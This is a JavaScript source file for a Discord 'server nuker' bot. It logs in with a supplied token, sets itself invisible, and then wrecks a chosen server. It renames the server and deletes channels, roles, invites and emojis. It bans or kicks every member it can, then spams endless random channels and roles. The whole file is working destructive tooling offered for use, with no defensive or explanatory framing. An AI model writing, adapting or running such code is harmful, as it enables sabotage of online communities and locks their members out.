const Discord = require('discord.js')
const readlineSync = require('readline-sync');
const randomColor = require('random-color');
const client = new Discord.Client();

//Random text generator
function MakeID(length) {
    var Result = '';
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (var i = 0; i < length; i++) {
        Result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return Result;
}

//Spam with random text channels
async function SpamChannels(GuildID) {
    const guild = client.guilds.get(GuildID);

    while (true) {
        await guild.createChannel(MakeID(32))
            .then(channel => console.log(`Created channel ${channel.name}`))
            .catch(() => { return; });
    }
}

//Spam with random roles
async function SpamRoles(GuildID) {
    const guild = client.guilds.get(GuildID);
    
    while (true) {
        await guild.createRole({name: MakeID(32), color: randomColor().hexString()})
            .then(role => console.log(`Created role ${role.name}`))
            .catch(() => { return; });
    }
}

//Delete server channel, roles and ban members
async function DestroyServer(GuildID) {
    const guild = client.guilds.get(GuildID);

    if (!guild) {
        console.log('Couldn\'t find the guild.');
        process.exit(0);
    }

    guild.setName(MakeID(32)).catch(() => {});
    guild.setIcon('https://upload.wikimedia.org/wikipedia/commons/thumb/2/21/Solid_black.svg/768px-Solid_black.svg.png');
    
    //Delete every channel
    for (channel of guild.channels) {
        if (channel[1].deletable) {
            channel[1].delete()
                .then(deleted => console.log(`Deleted channel ${deleted.name}`))
                .catch(console.error)
        }
    }

    //Delete every role
    for (role of guild.roles) {
        if (role[1].name != '@everyone' && role[1].editable) {
            role[1].delete()
                .then(deleted => console.log(`Deleted role ${deleted.name}`))
                .catch(console.error)
        }
    }

    //Ban every member
    await guild.fetchMembers();
    for (member of guild.members) {
        if (member[1].bannable) {
            member[1].ban()
                .then(banned => console.log(`Banned ${banned.user.tag}`))
                .catch(console.error)
        }
    }

    //Kick every left member
    await guild.fetchMembers();
    for (member of guild.members) {
        if (member[1].kickable) {
            member[1].kick()
                .then(banned => console.log(`Kicked ${banned.user.tag}`))
                .catch(console.error)
        }
    }

    //Delete every invite
    const invites = await guild.fetchInvites();
    for (invite of invites) {
        invite[1].delete()
            .then(deleted => console.log(`Deleted invite ${deleted.code}`))
            .catch(console.error)
    }

    //Delete every emoji
    for (emoji of guild.emojis) {
        if (emoji[1].deletable) {
            emoji[1].delete()
                .then(deleted => console.log(`Deleted emoji ${deleted.name}`))
                .catch(console.error)
        }
    }

    //Spam with random text channels and roles
    SpamChannels(GuildID);
    SpamRoles(GuildID);
}


client.on('ready', async () => {
    for (var i = 0; i != 100; i++) { console.log('') }
    console.log(`Logged in as ${client.user.tag}!`);
    client.user.setStatus('invisible');
    DestroyServer(GuildID);
})

var token = readlineSync.question('Token: ');
var GuildID = readlineSync.question('Server ID: ');

client.login(token);